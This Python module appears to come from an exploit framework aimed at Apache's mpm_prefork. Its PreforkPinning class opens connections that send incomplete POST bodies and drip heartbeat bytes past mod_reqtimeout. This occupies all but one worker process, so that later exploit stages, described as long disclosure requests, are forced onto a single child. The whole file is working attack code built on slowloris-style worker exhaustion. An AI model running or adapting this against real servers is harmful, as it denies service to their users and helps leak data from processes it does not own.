"""Fail-closed N-1 worker affinity for Apache ``mpm_prefork``.

The exploit stages themselves use ordinary short-lived HTTP connections.  By
occupying every other prefork child with an incomplete request body, each
stage is forced onto the one unheld child.  The holder heartbeat keeps
``mod_reqtimeout`` satisfied while long disclosure requests are in flight.
"""

from __future__ import annotations

import select
import socket
import threading
from dataclasses import dataclass

from core.target import Target


@dataclass
class _Holder:
    socket: socket.socket
    body_bytes_sent: int


class PreforkPinning:
    """Occupy exactly ``MaxRequestWorkers - 1`` prefork children.

    Any response, close, exceptional descriptor or heartbeat failure poisons
    the affinity context.  Call :meth:`ensure_healthy` immediately before and
    after every exploit stage; it never silently replaces a lost holder.
    """

    BODY_LENGTH = 1024 * 1024
    HEARTBEAT = b"P" * 1024
    HEARTBEAT_INTERVAL = 0.75

    def __init__(self, target: Target, workers: int) -> None:
        if target.scheme != "http":
            raise ValueError("prefork pinning currently requires direct HTTP")
        if workers < 1:
            raise ValueError("workers must be positive")
        try:
            target.path.encode("ascii")
            target.host_header.encode("ascii")
        except UnicodeEncodeError as exc:
            raise ValueError("target path and Host header must be ASCII") from exc
        self.target = target
        self.workers = workers
        self.count = workers - 1
        self._holders: list[_Holder] = []
        self._stop = threading.Event()
        self._thread: threading.Thread | None = None
        self._lock = threading.Lock()
        self._failures: dict[int, str] = {}

    @property
    def held_count(self) -> int:
        with self._lock:
            return len(self._holders)

    def _record_failure(self, index: int, reason: str) -> None:
        with self._lock:
            self._failures.setdefault(index, reason)

    def _active(self) -> list[tuple[int, _Holder]]:
        with self._lock:
            return [
                (index, holder)
                for index, holder in enumerate(self._holders)
                if index not in self._failures
            ]

    def _check_for_responses(self) -> None:
        active = self._active()
        if not active:
            return
        sockets = [holder.socket for _, holder in active]
        try:
            readable, _, exceptional = select.select(sockets, [], sockets, 0)
        except (OSError, ValueError) as exc:
            for index, _ in active:
                self._record_failure(index, f"health check failed: {exc}")
            return
        by_fd = {holder.socket.fileno(): index for index, holder in active}
        for sock in exceptional:
            self._record_failure(by_fd.get(sock.fileno(), -1), "socket exception")
        for sock in readable:
            index = by_fd.get(sock.fileno(), -1)
            try:
                data = sock.recv(1, socket.MSG_PEEK)
            except BlockingIOError:
                continue
            except OSError as exc:
                self._record_failure(index, f"read failed: {exc}")
                continue
            self._record_failure(
                index,
                "server returned a response" if data else "server closed connection",
            )

    def _heartbeat(self) -> None:
        while not self._stop.wait(self.HEARTBEAT_INTERVAL):
            self._check_for_responses()
            for index, holder in self._active():
                remaining = self.BODY_LENGTH - holder.body_bytes_sent
                if remaining <= 0:
                    self._record_failure(index, "holder request body was exhausted")
                    continue
                block = self.HEARTBEAT[:remaining]
                try:
                    sent = holder.socket.send(block)
                except BlockingIOError:
                    continue
                except OSError as exc:
                    self._record_failure(index, f"heartbeat failed: {exc}")
                    continue
                if sent <= 0:
                    self._record_failure(index, "heartbeat wrote zero bytes")
                    continue
                with self._lock:
                    holder.body_bytes_sent += sent

    def ensure_healthy(self) -> None:
        """Raise if affinity has been lost or holder setup is incomplete."""
        self._check_for_responses()
        with self._lock:
            failures = dict(self._failures)
            held = len(self._holders)
        if held != self.count:
            raise RuntimeError(
                f"worker pinning incomplete: holding {held}/{self.count} workers"
            )
        if failures:
            examples = ", ".join(
                f"#{index}: {reason}"
                for index, reason in list(failures.items())[:3]
            )
            raise RuntimeError(
                f"lost {len(failures)}/{self.count} worker pins ({examples})"
            )

    def __enter__(self) -> "PreforkPinning":
        request = (
            f"POST {self.target.path} HTTP/1.1\r\n"
            f"Host: {self.target.host_header}\r\n"
            "Content-Type: application/octet-stream\r\n"
            f"Content-Length: {self.BODY_LENGTH}\r\n"
            "Connection: close\r\n\r\nX"
        ).encode("ascii")
        try:
            if self.count:
                # Start monitoring before all sockets are opened.  Otherwise
                # the first holders can hit mod_reqtimeout while a high-latency
                # client is still dialing the last ones.
                self._thread = threading.Thread(
                    target=self._heartbeat,
                    name="prefork-holder-heartbeat",
                    daemon=True,
                )
                self._thread.start()
            for _ in range(self.count):
                sock: socket.socket | None = None
                try:
                    sock = socket.create_connection(
                        (self.target.connect_host, self.target.port),
                        timeout=min(self.target.timeout, 10.0),
                    )
                    sock.settimeout(min(self.target.timeout, 10.0))
                    sock.sendall(request)
                    sock.setblocking(False)
                except Exception:
                    if sock is not None:
                        try:
                            sock.close()
                        except OSError:
                            pass
                    raise
                assert sock is not None
                with self._lock:
                    self._holders.append(_Holder(sock, 1))
            self.ensure_healthy()
        except Exception:
            self.close()
            raise
        return self

    def close(self) -> None:
        self._stop.set()
        if self._thread is not None:
            self._thread.join(timeout=2.0)
            self._thread = None
        with self._lock:
            holders = list(self._holders)
            self._holders.clear()
        for holder in holders:
            try:
                holder.socket.close()
            except OSError:
                pass

    def __exit__(self, exc_type: object, exc: object, tb: object) -> None:
        self.close()


__all__ = ("PreforkPinning",)
